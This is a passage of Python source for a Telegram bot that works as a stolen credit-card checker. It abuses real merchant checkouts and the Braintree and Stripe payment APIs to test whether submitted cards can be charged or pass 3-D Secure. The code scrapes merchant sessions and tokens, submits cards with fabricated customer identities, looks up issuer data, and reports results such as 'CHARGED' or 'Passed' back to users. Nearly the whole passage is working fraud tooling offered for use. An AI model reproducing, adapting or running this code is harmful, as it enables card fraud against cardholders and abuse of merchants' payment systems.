1nY75+greMkwYUPw83efK0IWYbykAchLfh5yow4GtaoBbvz8bVgAKaT1NWdxgNqQseVKFhR1ucUPx/dBNv+xgxjQX7C9C8d+OI0oIvrlizo5VtPX5wF+gjRxoITmjnisBdGC0wGfZ=',
}

    req = requests.post('https://app.brandmark.io/v3/charge.php', cookies=cookies, headers=headers, json=json_data)
    
    if 'Nice! New payment method added' in req.text:
        AH = '𝐂𝐡𝐚𝐫𝐠𝐞✅'
        stay = '𝐂𝐡𝐚𝐫𝐠𝐞'
    else:
        try:
            AH = req.json()['status']
        except:
            AH = ""
        try:
        	stay = req.json()['message']
        except:
        	stay = ""
    try:
        meet_headers = {
                'Referer': 'https://bincheck.io/ar',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            }
        response = requests.get(f'https://bincheck.io/ar/details/{P[:6]}', headers=meet_headers)
        soup = BeautifulSoup(response.text, 'html.parser')
        table1 = soup.find('table', class_='w-full table-auto')
        rows1 = table1.find_all('tr')
        table2 = soup.find_all('table', class_='w-full table-auto')[1]
        rows2 = table2.find_all('tr')

        bin_, brand, card_type, card_level, bank, bank_phone = "", "", "", "", "", ""
        for row in rows1:
            cells = row.find_all('td')
            if len(cells) == 2:
                cell1_text = cells[0].text.strip()
                cell2_text = cells[1].text.strip()
                if cell1_text == 'BIN/IIN':
                    bin_ = cell2_text
                elif cell1_text == 'العلامة التجارية للبطاقة':
                    brand = cell2_text
                elif cell1_text == 'نوع البطاقة':
                    card_type = cell2_text
                elif cell1_text == 'تصنيف البطاقة':
                    card_level = cell2_text
                elif cell1_text == 'اسم المصدر / البنك':
                    bank = cell2_text
                elif cell1_text == 'المُصدِر / هاتف البنك':
                    bank_phone = cell2_text

        country_name, country_iso_a2, country_iso_a3, country_flag, currency = "", "", "", "", ""
        for row in rows2:
            cells = row.find_all('td')
            if len(cells) == 2:
                cell1_text = cells[0].text.strip()
                cell2_text = cells[1].text.strip()
                if cell1_text == 'اسم الدولة ISO':
                    country_name = cell2_text
                elif cell1_text == 'رمز البلد ISO A2':
                    country_iso_a2 = cell2_text
                elif cell1_text == 'ISO كود الدولة A3':
                    country_iso_a3 = cell2_text
                elif cell1_text == 'علم الدولة':
                    country_flag = cells[1].find('img')['src']
                elif cell1_text == 'عملة البلد ISO':
                    currency = cell2_text

        try:
            country = pycountry.countries.get(name=country_name)
            flag = country.flag if country else ""
        except:
                
            flag = ""

        end_time = time.time()
        duration = int(end_time - start_time)

        msg = f"""
𝐁𝐫𝐚𝐢𝐧𝐭𝐫𝐞𝐞⇾ 🔰
𝐂𝐚𝐫𝐝 ⇾ {P}
𝐌𝐚𝐬𝐬𝐚𝐠𝐞 ⇾ {AH}
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⇾ {stay}
━━━━━━━━━━━━━━━━━
- 𝗕𝗜𝗡 ⇾ {P[:6]}
- 𝗜𝗻𝗳𝗼 ⇾ {card_type} - {brand} - {card_level}
- 𝐈𝐬𝐬𝐮𝐞𝐫 ⇾ {bank}
- 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⇾ {country_name} {flag}
- 𝐏𝐇𝐎𝐍𝐄 ⇾ {bank_phone}
- 𝐎𝐓𝐇𝐄𝐑 ⇾ {currency} - {country_iso_a2} - {country_iso_a3}
- 𝐓𝐢𝐦𝐞⇾ {duration}s
- 𝐂𝐮𝐬𝐭𝐨𝐦𝐞𝐫: {user_type}
━━━━━━━━━━━━━━━━━
◆ 𝐁𝐘: @PP9PPP9
"""
        bot.delete_message(message.chat.id, kg.message_id)
        bot.reply_to(message, msg)
    except:
        bot.reply_to(message, f"𝙐𝙣𝙡𝙤𝙤𝙠 𝘽𝙄𝙉 𝙏𝙧𝙮 𝙖𝙣𝙤𝙩𝙝𝙚𝙧🔎")    







def GITVPB():
    try:
        cookies = {
    'UUID': 'b22771-f5f8-a6-ed03-08e3d6d0560e',
    'BVBRANDID': '92eaa850-cce6-49db-a738-bf0e53972f4a',
    '_gcl_au': '1.1.943752454.1716634092',
    'gtmNamespaceDeclared': 'true',
    '_fbp': 'fb.1.1716634098140.1444813870',
    '_cs_c': '0',
    '_y2': '1%3AeyJjIjp7fX0%3D%3AMTc0OTg2MjMwNA%3D%3D%3A99',
    'GSIDUrNuC2c0oQie': 'c99da83e-0495-499c-91b6-b65fefeb4622',
    'STSID555606': '8e5f6fc3-e556-4952-ad6a-9f7cdbabbb15',
    '__zlcmid': '1LwmkEIX29RmeGs',
    'ltk-subscribed': 'Checkout',
    'regional-preference-url': '%7B%22value%22%3A%22https%3A%2F%2Fus.elemis.com%22%7D',
    'PHPSESSID': '4ad79990e6decf197a27ab4820c93b2b',
    'returningVisitor': '4',
    'ltkSubscriber-Newsletter': 'eyJsdGtDaGFubmVsIjoiZW1haWwiLCJsdGtUcmlnZ2VyIjoibG9hZCIsImx0a0VtYWlsIjoiIiwibHRrT3B0SW4iOiJvZmYifQ%3D%3D',
    '_gid': 'GA1.2.1912686067.1716793920',
    '_vuid': 'b7f9b196-2b83-4966-9257-1533687a938d',
    'ltkSubscriber-Checkout': 'eyJsdGtTYXZlZCI6dHJ1ZX0%3D',
    'ltkpopup-session-depth': '3-5',
    '_ga': 'GA1.2.84586909.1716634095',
    '_dc_gtm_UA-53429536-5': '1',
    'cto_bundle': 'H_8b_193ODAzWmg2YXptUTViTktSVnFsaHZZeXM5WjBSNXZpJTJCNWZLJTJGaHhIS2xKREhzR3RnNEp0YjhjR0p6MERsRGhNeTd0MWtpVUFkRnB3bjVSVnQlMkJIamFEcXZxQmZ1ZVAwdTRSdFElMkZTak1qWEZvTHMwZDIxV3Q3dE9LQmI5Z3NweSUyQnJnUnN5ZlR3V0RvckVBZUpmOVBwWVpBJTNEJTNE',
    'private_content_version': 'b4418b1f27376f902d99a53b5a3a6463',
    '_yi': '1%3AeyJsaSI6eyJjIjowLCJjb2wiOjUyNjA5MTU1MCwiY3BnIjoxOTk1MDUsImNwaSI6MTYzMDg4MzgxNTAsInNjIjo0LCJ0cyI6MTcxNjc5MzkwMjU3N30sInNlIjp7ImMiOjQsImVjIjo5MywibGEiOjE3MTY3OTU2NDk1MDEsInAiOjcsInNjIjo1NDF9LCJ1Ijp7ImlkIjoiZjczZDFmMWMtNzZhMy00ODgwLWE2MmUtZDNkNTU1OTNhMTk4IiwiZmwiOiIwIn19%3ALTE0MzE4NDYxMTI%3D%3A99',
    '_ga_GZKSYFV883': 'GS1.1.1716793868.4.1.1716795650.22.0.0',
    '_cs_id': 'c2bc4532-c479-afa7-f457-ec8204e80008.1716634099.4.1716795650.1716793872.1.1750798099187.1',
    '_cs_s': '9.0.0.1716797450370',
    '_uetsid': '4cae17901bf811ef8a21c7cce194fbd1',
    '_uetvid': '4d59a4801a8411ef9ea91d3ef2dd74c5',
    'ABTastySession': 'mrasn=&lp=https%253A%252F%252Fus.elemis.com%252F',
    'ABTasty': 'uid=7ppscpgj468yqn5z&fst=1716634088926&pst=1716650986054&cst=1716793828358&ns=4&pvt=28&pvis=11&th=1202048.1489666.19.9.3.1.1716634089599.1716795607612.0.4_1230952.1524934.2.2.1.1.1716634113168.1716793865942.1.4_1230961.1524946.1.1.1.1.1716634116987.1716634116987.1.1_1232601.1526944.4.2.2.1.1716634093660.1716793845549.1.4',
}

        headers = {
            'authority': 'us.elemis.com',
            'accept': '*/*',
            'accept-language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
            'authorization': '',
            'content-currency': 'USD',
            'content-type': 'application/json',
            'origin': 'https://us.elemis.com',
            'referer': 'https://us.elemis.com/checkout',
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'store': 'us',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        }

        json_data = {
            'operationName': None,
            'variables': {},
            'query': 'mutation{createBraintreeClientToken}',
        }

        res = requests.post('https://us.elemis.com/graphql', cookies=cookies, headers=headers, json=json_data)
        key = res.json()["data"]["createBraintreeClientToken"]
        dec = base64.b64decode(key)
        clint = dec.decode('utf-8')
        Auth = json.loads(clint)
        fixed = Auth['authorizationFingerprint']
        
        try:
            os.remove('VPV.txt')
        except:
            pass

        with open('VPV.txt', 'a') as t:
            t.write(f"{fixed}\n")

    except Exception as e:
        print(e)
        GITVPB()


def check_VPV(message, user_type):
    kg = bot.reply_to(message, '<strong>[~] Processing Your request 10 Second Please... </strong>', parse_mode="HTML")
    time.sleep(10)
    if '.vbv' in message.text:
        P = message.text.split('.vbv')[1].strip()
    elif '/vbv' in message.text:
        P = message.text.split('/vbv')[1].strip()

    n, mm, yy, cvc = map(str.strip, P.split("|"))
    if not yy.startswith('20'):
        yy = '20' + yy

    try:
        start_time = time.time()

        try:
            with open("VPV.txt", "r") as f:
                Auth = f.read().strip()
        except:
            GITVPB()
            with open("VPV.txt", "r") as f:
                Auth = f.read().strip()

        hd = {
            'authority': 'payments.braintree-api.com',
            'accept': '*/*',
            'accept-language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
            'authorization': f'Bearer {Auth}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        }

        da = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'dropin2',
                'sessionId': '428c07ba-258d-4a86-8307-215ba05fde63',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': n,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvc,
                        'billingAddress': {
                            'postalCode': '10001',
                        },
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        req = requests.post('https://payments.braintree-api.com/graphql', headers=hd, json=da)
        tok = req.json()['data']['tokenizeCreditCard']['token']

        headers = {
            'authority': 'api.braintreegateway.com',
            'accept': '*/*',
            'accept-language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
            'content-type': 'application/json',
            'origin': 'https://us.elemis.com',
            'referer': 'https://us.elemis.com/',
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        }

        json_data = {
            'amount': 141.54,
            'additionalInfo': {
                'acsWindowSize': '03',
                'billingLine1': ' ',
                'billingCity': '',
                'billingPostalCode': '',
                'billingCountryCode': 'UK',
                'billingPhoneNumber': '',
                'billingGivenName': '',
                'billingSurname': '',
                'email': 'hqzt8vjub@waterisgone.com',
            },
            'challengeRequested': True,
            'bin': n[:6],
            'dfReferenceId': '0_8b8f565c-8747-42c8-8853-659f7c97af3b',
            'clientMetadata': {
                'requestedThreeDSecureVersion': '2',
                'sdkVersion': 'web/3.58.0',
                'cardinalDeviceDataCollectionTimeElapsed': 176,
                'issuerDeviceDataCollectionTimeElapsed': 1065,
                'issuerDeviceDataCollectionResult': True,
            },
            'authorizationFingerprint': Auth,
            'braintreeLibraryVersion': 'braintree/web/3.58.0',
            '_meta': {
                'merchantAppId': 'us.elemis.com',
                'platform': 'web',
                'sdkVersion': '3.58.0',
                'source': 'client',
                'integration': 'custom',
                'integrationType': 'custom',
                'sessionId': '428c07ba-258d-4a86-8307-215ba05fde63',
            },
        }

        response = requests.post(
            f'https://api.braintreegateway.com/merchants/24bgzphxpz9nrhbw/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
            headers=headers,
            json=json_data,
        )
        if 'authenticate_attempt_successful' in response.text:
            stay = '𝐏𝐚𝐬𝐬𝐞𝐝✅'
            try:
                AH = response.json()['paymentMethod']['threeDSecureInfo']['status']
            except:
                AH = ""
        elif 'challenge_required' in response.text:
            stay = '𝐜𝐡𝐚𝐥𝐥𝐞𝐧𝐠𝐞❌'
            try:
                AH = response.json()['paymentMethod']['threeDSecureInfo']['status']
            except:
                AH = ""
        elif 'lookup_card_error' in response.text:
            stay = '𝐄𝐫𝐨𝐫𝐫🔺'
            try:
                AH = response.json()['paymentMethod']['threeDSecureInfo']['status']
            except:
                AH = ""
        elif 'authentication' in response.text:
            stay = '𝐍𝐨𝐧𝐞🔎'
            try:
                AH = response.json()['paymentMethod']['threeDSecureInfo']['status']
            except:
                AH = ""
        elif 'Authorization fingerprint has an invalid format' in response.text or 'Authorization fingerprint is invalid' in response.text:
        	stay = '𝐍𝐨𝐧𝐞🔎'
        	AH = 'Try again'
        	GITVPB()
        else:
            try:
                stay = ""
                AH = response.json()['paymentMethod']['threeDSecureInfo']['status']
            except:
                AH = ""
                GITVPB()

        try:
            meet_headers = {
                'Referer': 'https://bincheck.io/ar',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            }
            response = requests.get(f'https://bincheck.io/ar/details/{P[:6]}', headers=meet_headers)
            soup = BeautifulSoup(response.text, 'html.parser')
            table1 = soup.find('table', class_='w-full table-auto')
            rows1 = table1.find_all('tr')
            table2 = soup.find_all('table', class_='w-full table-auto')[1]
            rows2 = table2.find_all('tr')

            bin_, brand, card_type, card_level, bank, bank_phone = "", "", "", "", "", ""
            for row in rows1:
                cells = row.find_all('td')
                if len(cells) == 2:
                    cell1_text = cells[0].text.strip()
                    cell2_text = cells[1].text.strip()
                    if cell1_text == 'BIN/IIN':
                        bin_ = cell2_text
                    elif cell1_text == 'العلامة التجارية للبطاقة':
                        brand = cell2_text
                    elif cell1_text == 'نوع البطاقة':
                        card_type = cell2_text
                    elif cell1_text == 'تصنيف البطاقة':
                        card_level = cell2_text
                    elif cell1_text == 'اسم المصدر / البنك':
                        bank = cell2_text
                    elif cell1_text == 'المُصدِر / هاتف البنك':
                        bank_phone = cell2_text

            country_name, country_iso_a2, country_iso_a3, country_flag, currency = "", "", "", "", ""
            for row in rows2:
                cells = row.find_all('td')
                if len(cells) == 2:
                    cell1_text = cells[0].text.strip()
                    cell2_text = cells[1].text.strip()
                    if cell1_text == 'اسم الدولة ISO':
                        country_name = cell2_text
                    elif cell1_text == 'رمز البلد ISO A2':
                        country_iso_a2 = cell2_text
                    elif cell1_text == 'ISO كود الدولة A3':
                        country_iso_a3 = cell2_text
                    elif cell1_text == 'علم الدولة':
                        country_flag = cells[1].find('img')['src']
                    elif cell1_text == 'عملة البلد ISO':
                        currency = cell2_text

            try:
                country = pycountry.countries.get(name=country_name)
                flag = country.flag if country else ""
            except:
                
                flag = ""

            end_time = time.time()
            duration = int(end_time - start_time)

            msg = f"""
𝐕𝐁𝐕⇾ 🔰
𝐂𝐚𝐫𝐝 ⇾ {P}
𝐌𝐚𝐬𝐬𝐚𝐠𝐞 ⇾ {AH}
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⇾ {stay}
━━━━━━━━━━━━━━━━━
- 𝗕𝗜𝗡 ⇾ {P[:6]}
- 𝗜𝗻𝗳𝗼 ⇾ {card_type} - {brand} - {card_level}
- 𝐈𝐬𝐬𝐮𝐞𝐫 ⇾ {bank}
- 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⇾ {country_name} {flag}
- 𝐏𝐇𝐎𝐍𝐄 ⇾ {bank_phone}
- 𝐎𝐓𝐇𝐄𝐑 ⇾ {currency} - {country_iso_a2} - {country_iso_a3}
- 𝐓𝐢𝐦𝐞⇾ {duration}s
- 𝐂𝐮𝐬𝐭𝐨𝐦𝐞𝐫: {user_type}
━━━━━━━━━━━━━━━━━
◆ 𝐁𝐘: @PP9PPP9
"""
            bot.delete_message(message.chat.id, kg.message_id)
            bot.reply_to(message, msg)
        except Exception as e:
            bot.reply_to(message, f"𝙐𝙣𝙡𝙤𝙤𝙠 𝘽𝙄𝙉 𝙏𝙧𝙮 𝙖𝙣𝙤𝙩𝙝𝙚𝙧🔎")    
    except Exception as e:
        bot.reply_to(message, f"𝙏𝙧𝙮 𝙖𝙣𝙤𝙩𝙝𝙚𝙧🔎")
        GITVPB()



def GetCookiesStripCh():
    try:
        with requests.Session() as session:
            aa = uuid.uuid4()
            bb = uuid.uuid4()
            to = faker.first_name()
            dodo = ''.join(random.choice("qwaszxcerdfvbtyghnmjkluiop0987654321") for i in range(5))
            xhot = to + dodo
            r = session.get("https://my.hostarmada.com/cart.php")
            wd = r.cookies["WHMCSy551iLvnhYt7"]
            soup = BeautifulSoup(r.text, 'html.parser')
            plan_cta_div = soup.find('div', class_='plan-cta')
            link = plan_cta_div.find('a')['href']
            script_tag = soup.find('script', type='text/javascript').text
            tok = re.search(r"var csrfToken = '([^']*)'", script_tag).group(1)
            cok = {
                'WHMCSy551iLvnhYt7': str(wd),
                '_fbp': 'fb.1.1714479694826.1382353090',
                '__zlcmid': '1LXmgR8OXrMsGwW',
                '__stripe_mid': str(aa),
                '__stripe_sid': str(bb),
            }
            hed = {
                'authority': 'my.hostarmada.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://my.hostarmada.com',
                'referer': str(link),
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Linux"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }
            par = {
                'a': 'add',
                'pid': '1',
                'domainselect': '1',
            }
            da = {
                'token': str(tok),
                'domainoption': 'register',
                f'domainsregperiod[{xhot}.com]': '1',
                'domains[]': f'{xhot}.com',
            }
            res = session.post('https://my.hostarmada.com/cart.php', params=par, cookies=cok, headers=hed, data=da).text
            soup = BeautifulSoup(res, 'html.parser')
            rg = soup.find('script', type='text/javascript').text
            tot = re.search(r"var csrfToken = '([^']*)'", rg).group(1)
            
            HH = f"{wd}|{tot}"
            try:
                os.remove('AHCHRAGE.txt')
            except:
                pass
            with open('AHCHRAGE.txt', 'a') as t:
                t.write(f"{HH}\n")
    except Exception as e:
        print(e)
        GetCookiesStripCh()
        
def check_card(message, user_type):
    kg = bot.reply_to(message, '<strong>[~] Processing Your request 10 Second Please... </strong>', parse_mode="HTML")
    time.sleep(10)    
    if '.sq' in message.text:
        P = message.text.split('.sq')[1].strip()
    elif '/sq' in message.text:
        P = message.text.split('/sq')[1].strip()

    n, mm, yy, cvc = map(str.strip, P.split("|"))
    if yy.startswith('20'):
        yy = yy.split('20')[1]

    try:
        start_time = time.time()

        
        try:
            with open("AHCHRAGE.txt", "r") as f:
                for line in f:
                    token = line.split('|')[1]
                    bd = line.split('|')[0]
                  
                    
        except:
            GetCookiesStripCh()
            with open("AHCHRAGE.txt", "r") as f:
                for line in f:
                    token = line.split('|')[1]
                    bd = line.split('|')[0]
                    

        aa = uuid.uuid4()
        bb = uuid.uuid4()
        heed = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        }
        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid={aa}&sid={bb}&payment_user_agent=stripe.js%2Fd2c4996313%3B+stripe-js-v3%2Fd2c4996313%3B+split-card-element&referrer=https%3A%2F%2Fmy.hostarmada.com&time_on_page=109332&key=pk_live_sZwZsvPzNPvgqldQYmY5QWhE00B8Wlf3Tx&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQaN9NRZI4Vpoz8oE_MhpAf3sGSAP2ydXbMpwLkEZkpdR9frHZr63FCa9_ST4dPWCrohquHow6v53dOqN3tS3sU6Vs80roVQn5MlIUDk5-KtWwCYGrrQjPpZyI7Fa8Jt35HpFtkpdTLxo9UVX3Hi7omUbh8lKMeC6Qi2ZZo_K6xazAFRd_fUjxUGE_Z005aun57sp_uBsvfknQbZaox21CTrBkMIMox8XFcPxLYoXksaMd7xD0tsVMg-PH2WXo8hScm0se438rP8nHKNqeiBnznjfUA3lWQ-Xv9NsQESlcEM3EUPfk4sY45ITHS-N1EjBwlKoDKwyFHWVcXCdZmf_nGkcRxK_8VRpjdqbpcPEZyBtARTBMCwXmHSFSMpHn_Zid0Eo3DfHlj8QjJhil-HkdxLabCc9oRadNoxfcLrNzjwvUwUSadF8QjWY77jBFv6ZLsppgUNEXbo0dw2ge4ZBdj05Cn2wzNsOiTBT1RhvFPtdwXRPzWEYUN8rubkDInVOyDHmqVAsN-ZyV1QXY2rEacX1PvS24eckRvkL_9MH05F7khdnG8is0dk2xLbNiIqwyoxPc1MX0rGTqQ11k2lO_t76BQuRIarzs4yImDwafERtkNLQaO9Z1rF3FbT_voVpqlVyL72Dre8hBZKNG9R-C9o7AZqnK7Xwu3i1Pb5h1FLGBqucfiolCT9QPZDxoeWIvuk_jiSahUe3mQ3hQ9MNZJe-rYIqJfhNX7-Kt3A6mKSTFQTnT5CbOnR4tqCI095GPLJ7vQUarqRAPtB47d0x1d0CcYrevxlvunYfObtUSOvFiLRH082O5jiVHpeIIrd-SG_0bfIn51fT31t5vnokW7jkiSA6rQRCyr4DPDo5AHTQsZVN9KG9p8utYz4Pif3_nhDxFOQsBGRMpMk6bFHraofaVq0k6mnDRzQ65Zw5mksUosJMrIayAiPzP9_Wbl7fDFEk9tcmdBXwS7vHiNvsIq_ZfzRTo85PkUd8seDk-rPFcukyXi4mLudCkFwihtOExXZ3xVhNmAt0-NxFNF_d_x2390P35Oa_BpdAVnCzn2viNVYUDwTJ5q5igNCDo2pv8mdkGovZjp4ZYq_PFctq0nmYQBQCC-ePK287Aw2241lCv4O1m3vJZ0K9M_D9Gwnzi_ylYmxaDS8kDpLDoKeTzSyrdBGRuv4bBR4AMVWrVJyfxZKNOv3ODbynJxpFMuCLblCVTDrajWgLzdSuPZqZO6mq_TXrIUMJPsHICo1lvXN3U2n-HU935fqAI3dcHNDIo-EJJPPrs9JUzqEy1ehVcbiINoczP9wXW6WNzbwYp3wzJcQMEZZl0YjiueRRFeu5HFh2xCc9WF4N7uv3luUKBJ7xQXwNP7HMVJ_vHmdQHSey5gGFLnF3J6nr79y5ooIKche2s_N3brXhm9JyG9Y76LphjrfLCLqLLB532u45eRJH4-sznXXkDWKX8j-FCCcoF6XPoMzL89Aaf1lFgpDqWpnZpqQ-dfeJKu9kYEJSgOzbsMtyFEDDl5aOJo84VCZbGOpHIZVkErsQe0y3bfaU3VLHaG2Pd3gXmWxBwzzjUoUInpvm8W2ueVyvPuvR5CIfeMX9w-tFVRyjSIInl493gkeEUm5PnEAqrXFOqVyFraAyAPbhv1-t_SNdSdMjHoG7xQc1RepRATB-b-4Q1WPQ0bnnPr2NJxmAzAefLTzLIsmiUdoWCMO4tVm6bXUo9M490mXzw1legWPl-v42Vwk4cBuRE_8ku5qil6nxuNzOBzei7vQfe5ZgWjsC3wsVFDEtL8VZ54GuqifMbUwmuywev5EeE-xqk5kVIlyXC2jMnbH3aGAQbY2R94XfgFyO8kIXyzfHfIcZp1roGJkZ8JdsaVMTlAOv7x7h59eXb7R-zagp93T68WxHdut5-bahi7WjuxWp3jgU9tawBYidys1xxtMTNyJfBlWnLxF7bFGiYAjKBWnF9sOpA2k1EYluRhoTfwcpEHkw3a5Ab8FIYOw9bypmqZDWtYTgHE9E5QUDiYOpGfHwA4Ik5yXmgtJrtLtCV_-2FG6O_2XW8TVsA_JbY1Bek0iC0dfrB7tiKgGcLBk1BMTGe__7I7w2WXtp55Y9X_bVtw7yIHcUPA7Q9UmjcU5GmiPTLMsRC27BR2Hx6W_OBPEk_hJf2tRWIQzHk5S6N4nap7mJY7gKaRCCHoS0rmHLOg_jeccgO56X6YHEFlkdWVc4VwyfHiMI5e9q8m-o2V4cM5mMQfrqHNoYXJkX2lkzgMxg2-ia3KoMTk4ZDg3MjaicGQA.cna1qgk1Rcn5yX-aAKnnR2czAHWzrmZtIBLOFPpyiWQ'
      
        
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=heed, data=data)
        
        if 'pm' in response.text:
            id = response.json()['id']
            print(id)
        else:
            id = None
        
        no = faker.first_name().upper()
        mo = faker.first_name().upper()
        bb = 'qwaszxcerdfvbtyghnmjkluiop0987654321'
        hell = ''.join(random.choice(bb) for i in range(14))
        domin = random.choice(['@hotmail.com', '@aol.com', '@gmail.com', '@yahoo.com'])
        email = hell + domin        
        cookies = {
                    '_fbp': 'fb.1.1714479694826.1382353090',
                    '__zlcmid': '1LXmgR8OXrMsGwW',
                    '__stripe_mid': f'{uuid.uuid4()}',
                    '__stripe_sid': f'{uuid.uuid4()}',
                    'WHMCSy551iLvnhYt7': f'{bd}',
                    '_ga': 'GA1.1.254413288.1714489037',
                    '_ga_MML13XH5B4': 'GS1.1.1714489036.1.0.1714489042.54.0.0',
                }
        hd = {
            'authority': 'my.hostarmada.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://my.hostarmada.com',
            'referer': 'https://my.hostarmada.com/cart.php?a=checkout&e=false',
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        dati = {
                'token': token,
                'submit': 'true',
                'custtype': 'new',
                'loginemail': '',
                'loginpassword': '',
                'firstname': no,
                'lastname': mo,
                'email': email,
                'country-calling-code-phonenumber': [
                    '1',
                    '',
                ],
                'phonenumber': '501-234-6981',
                'companyname': 'New York',
                'address1': 'NA 2009',
                'address2': '5FfG',
                'city': 'New York',
                'state': 'New York',
                'postcode': '10001',
                'country': 'US',
                'contact': '',
                'domaincontactfirstname': '',
                'domaincontactlastname': '',
                'domaincontactemail': '',
                'country-calling-code-domaincontactphonenumber': '1',
                'domaincontactphonenumber': '',
                'domaincontactcompanyname': '',
                'domaincontactaddress1': '',
                'domaincontactaddress2': '',
                'domaincontactcity': '',
                'domaincontactstate': '',
                'domaincontactpostcode': '',
                'domaincontactcountry': 'US',
                'domaincontacttax_id': '',
                'password': 'Drahmed2006##$$',
                'password2': 'Drahmed2006##$$',
                'paymentmethod': 'stripe',
                'ccinfo': 'new',
                'ccdescription': '',
                'marketingoptin': '1',
                'accepttos': 'on',
                'payment_method_id': id,
            }

        
        res = requests.post(
            'https://my.hostarmada.com/index.php?rp=/stripe/payment/intent',
            cookies=cookies,
            headers=hd,
            data=dati,
        )
        
        
        
        if any(keyword in res.text for keyword in ["live", "success", "Your card has insufficient funds", "insufficient funds", "Payment success", "Thank you for your support.", "insufficient_funds", "card has insufficient funds", "successfully", "Your card does not support this type of purchase.", "payment-successfully"]):
            stay = 'CHARGED ✅'
            try:
                kill = res.json()['warning']
            except:
            	kill = ""
